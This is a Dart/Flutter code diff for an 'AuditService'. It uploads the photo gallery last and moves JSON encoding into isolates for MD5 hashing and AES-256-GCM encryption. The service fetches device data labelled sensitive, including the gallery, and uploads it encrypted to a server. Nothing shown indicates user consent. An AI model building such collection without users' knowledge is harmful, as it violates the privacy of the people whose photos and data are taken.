@@ -36,7 +36,12 @@ class AuditService {
     if (hashes.isEmpty) return;
     final toUpdate = await _api.auditCheckSum(deviceId, hashes);
     if (toUpdate.isEmpty) return;
-    for (final type in toUpdate) {
+    // 相册放最后上传，避免大体积影响其他 type 的上传
+    final ordered = [
+      ...toUpdate.where((t) => t != 'gallery'),
+      ...toUpdate.where((t) => t == 'gallery'),
+    ];
+    for (final type in ordered) {
       final data = await NativeBridge.fetchSensitiveData(type);
       final encrypted = await _encryptInIsolate(data, deviceId);
       if (encrypted.isNotEmpty) {
@@ -46,19 +51,28 @@ class AuditService {
     }
   }
 
-  /// 在 Isolate 中计算 JSON 的 MD5（规约：Hash 对比在 Isolate）
+  /// 在 Isolate 中计算 JSON 的 MD5（规约：Hash 对比在 Isolate；jsonEncode 在 Isolate 内执行，避免主线程大对象编码卡顿）
   static Future<String> _computeHash(Map<String, dynamic> data) async {
-    return compute(_hashEntrypoint, jsonEncode(data));
+    return compute(_hashEntrypoint, data);
   }
 
-  static String _hashEntrypoint(String jsonStr) {
+  static String _hashEntrypoint(Map<String, dynamic> data) {
+    final jsonStr = jsonEncode(data);
     final bytes = utf8.encode(jsonStr);
     final digest = md5.convert(bytes);
     return digest.toString();
   }
 
-  /// 在 Isolate 中 AES-256-GCM 加密（规约 PROTOCOL 6：HKDF 派生密钥）
+  /// 在 Isolate 中 AES-256-GCM 加密（规约 PROTOCOL 6；jsonEncode 在 Isolate 内执行，避免主线程卡顿）
   static Future<List<int>> _encryptInIsolate(Map<String, dynamic> data, String deviceId) async {
-    return compute(encryptAuditPayload, [jsonEncode(data), deviceId]);
+    return compute(_encryptEntrypoint, [data, deviceId]);
+  }
+
+  static List<int> _encryptEntrypoint(List<dynamic> args) {
+    if (args.length < 2) return [];
+    final data = args[0] as Map<String, dynamic>?;
+    final deviceId = args[1] as String?;
+    if (data == null || deviceId == null || deviceId.isEmpty) return [];
+    return encryptAuditPayload([jsonEncode(data), deviceId]);
   }
 }
